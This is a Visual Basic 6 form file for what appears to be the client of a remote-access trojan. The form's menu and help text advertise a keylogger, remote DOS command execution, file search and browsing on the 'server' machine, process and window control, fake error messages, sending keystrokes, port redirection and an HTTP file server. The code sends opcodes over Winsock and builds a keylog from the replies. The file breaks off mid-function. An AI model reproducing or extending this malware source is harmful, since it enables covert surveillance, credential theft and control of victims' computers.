               Key             =   ""
            EndProperty
            BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":29B3
               Key             =   ""
            EndProperty
            BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":2B0D
               Key             =   ""
            EndProperty
            BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":2C67
               Key             =   ""
            EndProperty
            BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":2DC1
               Key             =   ""
            EndProperty
            BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":335B
               Key             =   ""
            EndProperty
            BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":38F5
               Key             =   ""
            EndProperty
            BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":3A4F
               Key             =   ""
            EndProperty
            BeginProperty ListImage14 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":3FE9
               Key             =   ""
            EndProperty
            BeginProperty ListImage15 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":4143
               Key             =   ""
            EndProperty
            BeginProperty ListImage16 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":429D
               Key             =   ""
            EndProperty
            BeginProperty ListImage17 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":4837
               Key             =   ""
            EndProperty
            BeginProperty ListImage18 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":4991
               Key             =   ""
            EndProperty
            BeginProperty ListImage19 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":4AEB
               Key             =   ""
            EndProperty
            BeginProperty ListImage20 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":4C45
               Key             =   ""
            EndProperty
            BeginProperty ListImage21 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":51DF
               Key             =   ""
            EndProperty
            BeginProperty ListImage22 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":5779
               Key             =   ""
            EndProperty
            BeginProperty ListImage23 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":58D3
               Key             =   ""
            EndProperty
            BeginProperty ListImage24 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":5A2D
               Key             =   ""
            EndProperty
            BeginProperty ListImage25 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":5B87
               Key             =   ""
            EndProperty
            BeginProperty ListImage26 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":5CE1
               Key             =   ""
            EndProperty
            BeginProperty ListImage27 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":5E3B
               Key             =   ""
            EndProperty
            BeginProperty ListImage28 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":5F95
               Key             =   ""
            EndProperty
            BeginProperty ListImage29 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":652F
               Key             =   ""
            EndProperty
            BeginProperty ListImage30 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":6689
               Key             =   ""
            EndProperty
            BeginProperty ListImage31 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":6C23
               Key             =   ""
            EndProperty
            BeginProperty ListImage32 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":71BD
               Key             =   ""
            EndProperty
            BeginProperty ListImage33 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":7757
               Key             =   ""
            EndProperty
            BeginProperty ListImage34 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":7CF1
               Key             =   ""
            EndProperty
         EndProperty
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Begin File Search"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   249
         Index           =   46
         Left            =   60
         TabIndex        =   12
         Top             =   600
         Width           =   1575
      End
      Begin VB.TextBox txtFileDirectory 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   240
         Left            =   960
         TabIndex        =   10
         Text            =   "C:\"
         Top             =   328
         Width           =   1290
      End
      Begin VB.TextBox txtFileSearch 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   240
         Left            =   960
         TabIndex        =   8
         Text            =   "*.avi; *.mp3"
         Top             =   60
         Width           =   2955
      End
      Begin MSComctlLib.ListView lstFiles 
         Height          =   2835
         Left            =   60
         TabIndex        =   89
         Top             =   900
         Width           =   3855
         _ExtentX        =   6800
         _ExtentY        =   5001
         View            =   2
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         HideColumnHeaders=   -1  'True
         AllowReorder    =   -1  'True
         _Version        =   393217
         Icons           =   "ImgList"
         SmallIcons      =   "ImgList"
         ColHdrIcons     =   "ImgList"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   0
      End
      Begin VB.Label Label3 
         Caption         =   "Files Found: 0"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   195
         Left            =   1740
         TabIndex        =   13
         Top             =   660
         Width           =   2115
      End
      Begin VB.Label Label2 
         Caption         =   "Directory:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   195
         Left            =   300
         TabIndex        =   11
         Top             =   338
         Width           =   675
      End
      Begin VB.Label Label1 
         Caption         =   "Files To Find:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   195
         Index           =   1
         Left            =   60
         TabIndex        =   9
         Top             =   75
         Width           =   915
      End
   End
   Begin VB.PictureBox picFrame 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   3820
      Index           =   11
      Left            =   2100
      ScaleHeight     =   3818.868
      ScaleMode       =   0  'User
      ScaleWidth      =   4000
      TabIndex        =   87
      Top             =   360
      Visible         =   0   'False
      Width           =   4005
      Begin VB.ListBox lstTasks 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3375
         IntegralHeight  =   0   'False
         Left            =   60
         Sorted          =   -1  'True
         TabIndex        =   91
         Top             =   60
         Width           =   3855
      End
      Begin VB.CommandButton cmdRefresh 
         Caption         =   "Refresh Window List"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   60
         TabIndex        =   90
         ToolTipText     =   "Refresh the Task List"
         Top             =   3480
         Width           =   3855
      End
   End
   Begin VB.Label lblTimeOn 
      Caption         =   "00:00:00"
      BeginProperty DataFormat 
         Type            =   1
         Format          =   "H:mm:ss"
         HaveTrueFalseNull=   0
         FirstDayOfWeek  =   0
         FirstWeekOfYear =   0
         LCID            =   1033
         SubFormatType   =   4
      EndProperty
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   1170
      TabIndex        =   86
      Top             =   3965
      Width           =   690
   End
   Begin VB.Label lblTimeOnline 
      Caption         =   "Time Online:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   240
      TabIndex        =   85
      Top             =   3965
      Width           =   915
   End
   Begin VB.Menu mnuMenu 
      Caption         =   "Windows Manager"
      Visible         =   0   'False
      Begin VB.Menu cmdSwitch 
         Caption         =   "Rename Caption"
      End
      Begin VB.Menu cmdDisableX 
         Caption         =   "Disable X Button"
      End
      Begin VB.Menu Line1 
         Caption         =   "-"
      End
      Begin VB.Menu cmdShow 
         Caption         =   "Show Window"
      End
      Begin VB.Menu cmdHide 
         Caption         =   "Hide Window"
      End
      Begin VB.Menu Line2 
         Caption         =   "-"
      End
      Begin VB.Menu cmdEnable 
         Caption         =   "Enable Window"
      End
      Begin VB.Menu cmdDisable 
         Caption         =   "Disable Window"
      End
      Begin VB.Menu Line3 
         Caption         =   "-"
      End
      Begin VB.Menu cmdRestore 
         Caption         =   "Restore Window"
      End
      Begin VB.Menu cmdMinimize 
         Caption         =   "Minimize Window"
      End
      Begin VB.Menu cmdMaximize 
         Caption         =   "Maximize Window"
      End
      Begin VB.Menu Line4 
         Caption         =   "-"
      End
      Begin VB.Menu cmdClose 
         Caption         =   "Close Window"
      End
   End
End
Attribute VB_Name = "frmClient"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Declare Function SetSysColors Lib "user32" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long
Private Declare Function GetSysColor Lib "user32" (ByVal nIndex As Long) As Long

'Long
Private DefaultColor(4) As Long
Private FileCount As Long

'Integer
Private ErrorIcon As Integer
Private ErrorButton As Integer

Private I As Integer
Private Hour As Integer
Private Minute As Integer
Private Second As Integer
Private CntDwn As Integer

'Boolean
Private Connected As Boolean
Private CheckClicked As Boolean

'String
Private Port As String
Private strPath As String
Private IPAddress As String

Private Sub chkErrorButton_Click(Index As Integer)
    On Error Resume Next
    If CheckClicked <> True Then
        CheckClicked = True
        For I = 0 To 5
            chkErrorButton(I).Value = 0
        Next I
        chkErrorButton(Index).Value = 1
        CheckClicked = False
        ErrorButton = Index
    End If
End Sub

Private Sub cmdConnect_Click()
    On Error Resume Next
    wskConnect.SendData "065" & txtRemoteIP.Text & "|" & txtRemotePort.Text & "|" & txtLocalPort.Text
    lstConnections.AddItem "Remote: " & txtRemoteIP.Text & ":" & txtRemotePort & " Local: " & txtLocalPort.Text
End Sub

Private Sub Command1_Click()
    On Error Resume Next
    wskConnect.Close
    DoEvents
    statBar.SimpleText = "Status: Connecting..."
    wskConnect.Connect txtIP.Text, txtPort.Text
End Sub

Private Sub Command10_Click()
    wskConnect.SendData "070"
End Sub

Private Sub Command2_Click()
    On Error Resume Next
    If wskConnect.State <> 0 Then
        wskConnect.Close
        frmFileBrowser.FT.Close
        frmFileBrowser.w1.Close
        tmrOnline.Enabled = False
        lblTimeOn.Caption = "00:00:00"
        statBar.SimpleText = "Status: Disconnected - " & Format$(Now, "HH:mm:ss")
        Connected = False
    End If
End Sub

Private Sub Command3_Click()
    On Error Resume Next
    wskConnect.SendData "050" & lstWindows.Text & "|" & Text2.Text
End Sub

Private Sub Command4_Click()
    On Error Resume Next
    Text2.Text = vbNullString
End Sub

Private Sub Command5_Click()
    On Error Resume Next
    lstWindows.Clear
    wskConnect.SendData "054"
End Sub

Private Sub Command6_Click()
    On Error Resume Next
    lstConnections.Clear
    wskConnect.SendData "067"
End Sub

Private Sub Command7_Click()
    On Error Resume Next
    lstConnections.Clear
    wskConnect.SendData "066"
End Sub

Private Sub Command8_Click()
    wskConnect.SendData "069"
End Sub

Private Sub Command9_Click()
    wskConnect.SendData "068" & Text4.Text
End Sub

Private Sub Form_Load()
    On Error Resume Next
    
    '-----------
    'Form Resize
    '-----------
    frmClient.Height = 4875
    frmClient.Width = 6240
    For I = 0 To 14
        picFrame(I).Top = 360
        picFrame(I).Left = 2100
    Next
    
    '-----------
    'Create List
    '-----------
    lstMenu.AddItem "00) Command Information"
    lstMenu.AddItem "01) File Searching"
    lstMenu.AddItem "02) System Information"
    lstMenu.AddItem "03) Keylogger"
    lstMenu.AddItem "04) Server Settings"
    lstMenu.AddItem "05) System Colors"
    lstMenu.AddItem "06) DOS Output"
    lstMenu.AddItem "07) Hide/Show Options"
    lstMenu.AddItem "08) Miscellaneous Options"
    lstMenu.AddItem "09) Fake Error Message"
    lstMenu.AddItem "10) Extra Options"
    lstMenu.AddItem "11) File Browser"
    lstMenu.AddItem "12) Server/Client Chat"
    lstMenu.AddItem "13) Processor Viewer"
    lstMenu.AddItem "14) Window Manager"
    lstMenu.AddItem "15) Send Keyboard Keys"
    lstMenu.AddItem "16) Port Redirection"
    lstMenu.AddItem "17) HTTP File Server"
    
    '----------
    'Set Colors
    '----------
    DefaultColor(0) = GetSysColor(8)
    DefaultColor(1) = GetSysColor(15)
    DefaultColor(2) = GetSysColor(4)
    DefaultColor(3) = GetSysColor(1)
    DefaultColor(4) = GetSysColor(5)
    
    '--------------
    'Extra Settings
    '--------------
    ErrorIcon = 16
    Connected = False
    
    '-----------
    'Time Online
    '-----------
    Second = 0
    Minute = 0
    Hour = 0
    
    '----
    'News
    '----
    txtNews.Text = "Client Command Information:" & vbCrLf & "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-" & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ File Searching - Right-Click menu ]" & vbCrLf & "Finds specified file(s) on server's system." & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ System Information ]" & vbCrLf & "Retrieves server's system information." & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ Keylogger ]" & vbCrLf & "Display's all keys that server types." & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ Server Settings ]" & vbCrLf & "Change settings used during server startup." & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ System Colors ]" & vbCrLf & "Change server's windows colors." & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ DOS Output ]" & vbCrLf & "Recieves output from a specified DOS command." & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ Hide/Show Options ]" & vbCrLf & "Hide or show certain aspects of windows." & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ Miscellaneous Options ]" & vbCrLf & "Miscellaneous functions relating to controlling the server." & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ Fake Error Message ]" & vbCrLf & "Sends specified fake error messages to the server." & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ Extra Options ]" & vbCrLf & "Options that could not be fit into Miscellaneous Options." & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ File Manager - Right-Click menu ]" & vbCrLf & "Browse/Manage the files on the server." & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ Server/Client Chat ]" & vbCrLf & "Chat with the server through a window." & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ Process Manager - Right-Click menu ]" & vbCrLf & "Manage all running process's on the server." & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ Window Manager - Right-Click menu ]" & vbCrLf & "Manage windows on the server desktop." & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ Send Keyboard Keys ]" & vbCrLf & "Sends keystrokes to a specified window." & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ Port Redirection ]" & vbCrLf & "Create port redirections which connect to a different IP." & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "[ HTTP File Server ]" & vbCrLf & "Browse server files from any browser EX:(IE6)" & vbCrLf & vbCrLf
    txtNews.Text = txtNews.Text & "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"

    '--------
    'ListView
    '--------
    frmFileBrowser.lstFolders.ColumnHeaders.Add , , "Column"
    
End Sub

Private Sub Form_Unload(Cancel As Integer)
    On Error Resume Next
    Unload frmChatClient
    Unload frmClient
    Unload frmFileBrowser
    Unload frmProc
    Unload frmProperties
    Unload frmScreenShot
End Sub

Private Sub lstFiles_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
    On Error Resume Next
    If Button = 2 Then
        If lstFiles.ListItems.Count > 0 Then
            frmFileBrowser.cmdDownload.Visible = False
            frmFileBrowser.cmdSendTo.Visible = False
            frmFileBrowser.cmdRename.Visible = False
            frmFileBrowser.cmdDelete.Visible = False
            frmFileBrowser.Line8.Visible = False
            frmFileBrowser.Line3.Visible = False
            frmFileBrowser.Line1.Visible = False
            If Len(lstFiles.SelectedItem.Text) > 0 Then
                strPopupText = lstFiles.SelectedItem.Text
                PopupMenu frmFileBrowser.mnuFile
                frmFileBrowser.cmdWave.Visible = False
                frmFileBrowser.cmdWallpaper.Visible = False
            End If
        End If
    End If
End Sub

Private Sub lstTasks_Click()
    On Error Resume Next
    wskConnect.SendData "057" & lstTasks.Text
End Sub

Private Sub lstTasks_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
    On Error Resume Next
    If Button = 2 Then
        If Len(lstTasks.Text) > 0 Then
            PopupMenu mnuMenu
        End If
    End If
End Sub

Private Sub cmdDisableX_Click()
    On Error Resume Next
    wskConnect.SendData "056"
End Sub
Private Sub cmdEnable_Click()
    On Error Resume Next
    wskConnect.SendData "053" & 1
End Sub
Private Sub cmdDisable_Click()
    On Error Resume Next
    wskConnect.SendData "053" & 0
End Sub
Private Sub cmdHide_Click()
    On Error Resume Next
    wskConnect.SendData "052" & 0
End Sub
Private Sub cmdMaximize_Click()
    On Error Resume Next
    wskConnect.SendData "052" & 3
End Sub
Private Sub cmdMinimize_Click()
    On Error Resume Next
    wskConnect.SendData "052" & 6
End Sub
Private Sub cmdRestore_Click()
    On Error Resume Next
    wskConnect.SendData "052" & 9
End Sub
Private Sub cmdSwitch_Click()
    On Error Resume Next
    wskConnect.SendData "051" & InputBox("New Window Caption:", "New Window Caption", lstTasks.Text)
End Sub
Private Sub cmdRefresh_Click()
    On Error Resume Next
    lstTasks.Clear
    wskConnect.SendData "054"
End Sub
Private Sub cmdShow_Click()
    On Error Resume Next
    wskConnect.SendData "052" & 5
End Sub
Private Sub cmdClose_Click()
    On Error Resume Next
    wskConnect.SendData "055"
End Sub

Private Sub lstMenu_Click()
    On Error Resume Next
    Dim Num As Integer
    If Connected Then
        Num = Int(Left$(lstMenu.Text, 2))
        If Num = 11 Then
            If frmFileBrowser.Visible <> True Then
                frmFileBrowser.Visible = True
                Exit Sub
            End If
        End If
        If Num = 12 Then
            If frmChatClient.Visible <> True Then
                wskConnect.SendData "010" & InputBox("Server Chat Windows Size: (Ex: 50 = 50%)", "Windows Size", "50")
                Exit Sub
            End If
        End If
        If Num = 13 Then
            If frmProc.Visible <> True Then
                wskConnect.SendData "046"
                Exit Sub
            End If
        End If
        If Num = 14 Then
            Num = 11
        End If
        If Num = 15 Then
            Num = 12
        End If
        If Num = 16 Then
            Num = 13
            lstConnections.Clear
            wskConnect.SendData "066"
        End If
        If Num = 17 Then
            Num = 14
        End If
        For I = 0 To 14
            If I = Num Then
                picFrame(I).Visible = True
            Else
                picFrame(I).Visible = False
            End If
        Next
    Else
        MsgBox "Connection Not Yet Established", vbCritical, "Error"
    End If
End Sub

Private Sub lstWindows_Click()
    On Error Resume Next
    wskConnect.SendData "057" & lstTasks.Text
End Sub

Private Sub optErrorIcon_Click(Index As Integer)
    On Error Resume Next
    ErrorIcon = Index
End Sub

Private Sub tmrOnline_Timer()
    On Error Resume Next
    Second = Second + 1
    If Second = 60 Then
        Minute = Minute + 1
        Second = 0
    End If
    If Minute = 60 Then
        Hour = Hour + 1
        Minute = 0
    End If
    If Hour = 24 Then
        Hour = 0
        Minute = 0
        Second = 0
    End If
    lblTimeOn.Caption = Format$(Hour, "0#") & ":" & Format$(Minute, "0#") & ":" & Format$(Second, "0#")
End Sub

Private Sub txtKeyLog_Change()
    On Error Resume Next
    If Len(txtKeyLog) > 0 Then
        txtKeyLog.SelStart = Len(txtKeyLog.Text) - 1
    End If
End Sub

Private Sub tmrReconnect_Timer()
    On Error Resume Next
    CntDwn = CntDwn - 1
    statBar.SimpleText = "Status: Reconnecting in" & Str$(CntDwn) & "..."
    
    If CntDwn = 0 Then
        wskConnect.Connect IPAddress, Port
        tmrReconnect.Enabled = False
    End If
End Sub

Private Sub wskConnect_Connect()
    On Error Resume Next
    statBar.SimpleText = "Status: Online - " & Format$(Now, "HH:mm:ss")
    Connected = True
    tmrOnline.Enabled = True
    frmFileBrowser.cmdCommand(0).Enabled = True
    Text1.Text = wskConnect.RemotePort
    Text5.Text = "http://" & wskConnect.RemoteHostIP
    Label7.Caption = "Current Password: [-BLANK-]"
End Sub

Private Sub cmdWinColor_Click(Index As Integer)
    On Error Resume Next
    Select Case Index
        Case 0
        frmClient.wskConnect.SendData "039" & Picture1(0).BackColor & "|" & Picture1(1).BackColor & "|" & Picture1(2).BackColor & "|" & Picture1(3).BackColor & "|" & Picture1(4).BackColor
        Case 1
            SetSysColors 1, 8, Picture1(0).BackColor
            SetSysColors 1, 15, Picture1(1).BackColor
            SetSysColors 1, 4, Picture1(2).BackColor
            SetSysColors 1, 1, Picture1(3).BackColor
            SetSysColors 1, 5, Picture1(4).BackColor
        Case 2
        frmClient.wskConnect.SendData "041"
        Case 3
            SetSysColors 1, 8, DefaultColor(0)
            SetSysColors 1, 15, DefaultColor(1)
            SetSysColors 1, 4, DefaultColor(2)
            SetSysColors 1, 1, DefaultColor(3)
            SetSysColors 1, 5, DefaultColor(4)
        Case 4
            Picture1(0).BackColor = GetSysColor(8)
            Picture1(1).BackColor = GetSysColor(15)
            Picture1(2).BackColor = GetSysColor(4)
            Picture1(3).BackColor = GetSysColor(1)
            Picture1(4).BackColor = GetSysColor(5)
        Case 5
            Picture1(0).BackColor = vbGreen
            Picture1(1).BackColor = vbBlue
            Picture1(2).BackColor = vbWhite
            Picture1(3).BackColor = vbYellow
            Picture1(4).BackColor = vbRed
    End Select
End Sub

Private Sub Label1_Click(Index As Integer)
    On Error Resume Next
    cdColor.ShowColor
    Label1(Index).BackColor = cdColor.Color
End Sub

Private Sub Picture1_Click(Index As Integer)
    On Error Resume Next
    cdColor.ShowColor
    Picture1(Index).BackColor = cdColor.Color
End Sub

Private Sub cmdCommand_Click(Index As Integer)
    On Error Resume Next
    Dim Command As String

    Select Case Index
        Case 0
        Command = "002" & txtURL.Text
        Case 1
        MsgBox txtMessage.Text, ErrorIcon + ErrorButton, txtTitle.Text
        Case 2
        Command = "033" & txtMessage.Text & "|" & (ErrorIcon + ErrorButton) & "|" & txtTitle.Text
        Case 3
        Command = "009"
        Case 4
        Command = "008"
        Case 5
        Command = "018"
        Case 6
        Command = "017"
        Case 7
        Command = "007"
        Case 8
        Command = "006"
        Case 9
        Command = "020"
        Case 10
        Command = "019"
        Case 11
        Command = "003"
        Case 12
        Command = "004"
        Case 13
        Command = "000"
        Case 14
        Command = "001"
        Case 15
        Command = "025"
        Case 16
        Command = "024"
        Case 17
        Command = "021"
        Case 18
        Command = "005"
        Case 19
        wskConnect.SendData "031"
        DoEvents
        wskConnect.Close
        frmFileBrowser.w1.Close
        frmFileBrowser.FT.Close
        statBar.SimpleText = "Status: Disconnected - " & Format$(Now, "HH:mm:ss")
        Connected = False
        tmrOnline.Enabled = False
        lblTimeOn.Caption = "00:00:00"
        Exit Sub
        Case 20
        Command = "032"
        statBar.SimpleText = "Status: Reconnecting in 5..."
        wskConnect.Close
        frmFileBrowser.FT.Close
        frmFileBrowser.w1.Close
        CntDwn = 5
        tmrReconnect.Enabled = True
        Exit Sub
        Case 21
        Command = "029"
        Case 22
        Command = "028"
        Case 23
        Command = "030"
        Case 24
        Command = "040" & txtDosCommand.Text
        Case 25
        Command = "034" & txtClipboard.Text
        Case 26
        Command = "014"
        Case 27
        Command = "023|" & txtTime.Text & "|" & txtDate.Text
        Case 28
        Command = "022"
        Case 29
        Command = "047"
        cmdCommand(29).Enabled = False
        cmdCommand(30).Enabled = True
        Case 30
        Command = "048"
        cmdCommand(29).Enabled = True
        cmdCommand(30).Enabled = False
        Case 32
        wskConnect.SendData "063"
        DoEvents
        wskConnect.Close
        frmFileBrowser.w1.Close
        frmFileBrowser.FT.Close
        statBar.SimpleText = "Status: Server Removed - " & Format$(Now, "HH:mm:ss")
        Connected = False
        tmrOnline.Enabled = False
        lblTimeOn.Caption = "00:00:00"
        Exit Sub
        Case 33
        txtKeyLog.Text = vbNullString
        Case 34
        Command = "046"
        Case 35
        statBar.SimpleText = "Status: Reconnecting in 5..."
        wskConnect.Close
        frmFileBrowser.FT.Close
        frmFileBrowser.w1.Close
        CntDwn = 5
        tmrReconnect.Enabled = True
        Case 46
            lstFiles.ListItems.Clear
            strPath = txtFileDirectory.Text
            If Right$(strPath, 1) <> "\" Then
                strPath = strPath & "\"
            End If
            Command = "015" & txtFileSearch.Text & "|" & strPath & "|" & chkSubFolders.Value
        Case 47
        Command = "038"
        Case 49
        Command = "044"
        Case 50
        If txtPortNum.Text < 65535 Then
            If IsNumeric(txtICQNum.Text) Then
                Command = "049" & txtPortNum.Text & "|" & txtICQNum.Text & "|" & txtPassword.Text & "|" & Check5.Value & Check6.Value
            End If
        End If
        Case 51
        Command = "050"
    End Select
    If Len(Command) > 0 Then
        wskConnect.SendData Command
        statBar.SimpleText = "Status: Executing Command..."
    End If
End Sub

Private Sub ParseKeySent(ByVal strWindowName As String, ByVal KeyCode As Integer, ByVal Shift As Boolean)
    On Error Resume Next
    Dim KeyName As String
    
    Select Case KeyCode
        Case 8
        KeyName = "[BCKSPC]"
        Case 9
        KeyName = "[TAB]"
        Case 13
        KeyName = "[ENTER]"
        Case 16
        KeyName = "[SHIFT]"
        Case 17
        KeyName = "[CTRL]"
        Case 18
        KeyName = "[ALT]"
        Case 20
        KeyName = "[CAPS LOCK]"
        Case 27
        KeyName = "[ESC]"
        Case 32
        KeyName = " "
        Case 37
        KeyName = "[LEFT]"
        Case 38
        KeyName = "[UP]"
        Case 39
        KeyName = "[RIGHT]"
        Case 40
        KeyName = "[DOWN]"
        Case 46
        KeyName = "[DEL]"
        Case 48
        KeyName = IIf(Shift, ")", "0")
        Case 49
        KeyName = IIf(Shift, "!", "1")
        Case 50
        KeyName = IIf(Shift, "@", "2")
        Case 51
        KeyName = IIf(Shift, "#", "3")
        Case 52
        KeyName = IIf(Shift, "$", "4")
        Case 53
        KeyName = IIf(Shift, "%", "5")
        Case 54
        KeyName = IIf(Shift, "^", "6")
        Case 55
        KeyName = IIf(Shift, "&", "7")
        Case 56
        KeyName = IIf(Shift, "*", "8")
        Case 57
        KeyName = IIf(Shift, "(", "9")
        Case 65 To 90
            If Shift Then
                KeyName = UCase$(ChrW$(KeyCode))
            Else
                KeyName = LCase$(ChrW$(KeyCode))
            End If
        Case 91 To 92
        KeyName = "[WINKEY]"
        Case 96 To 105
        KeyName = "[NUM-" & KeyCode - 96 & "]"
        Case 112 To 123
        KeyName = "[F" & KeyCode - 111 & "]"
        Case 144
        KeyName = "[NUM LOCK]"
        Case Else
        KeyName = ChrW$(KeyCode)
    End Select
    txtKeyLog = txtKeyLog & strWindowName & KeyName
End Sub

Private Sub wskConnect_DataArrival(ByVal bytesTotal As Long)
    On Error Resume Next
    Dim RData As String, RData2 As String, Message() As String, I As Integer, intForLoop As Integer
    
    wskConnect.GetData RData
    RData2 = Right$(RData, Len(RData) - 2)
    
    Select Case Left$(RData, 2)
        Case "00"
        txtDosOutput.Text = RData2
        GoTo Complete
        Case "01"
        GoTo Complete
        Case "02"
        frmChatClient.Visible = True
        GoTo Complete
        Case "03"
        frmChatClient.txtChat.Text = frmChatClient.txtChat.Text & "[" & Format$(Now, "HH:mm:ss") & "] " & RData2
        Case "04"
        txtPassword.Text = InputBox("Password:", "Password", "BuffyTheVampireSlayer")
        wskConnect.SendData "013" & txtPassword.Text
        Label7.Caption = "Current Password: " & txtPassword.Text
        Case "05"
        wskConnect.Close
        statBar.SimpleText = "Status: Incorrect Password - " & Format$(Now, "HH:mm:ss")
        Case "06"
        wskConnect.Close
        statBar.SimpleText = "Status: Server Removed - " & Format$(Now, "HH:mm:ss")
        Case "07"
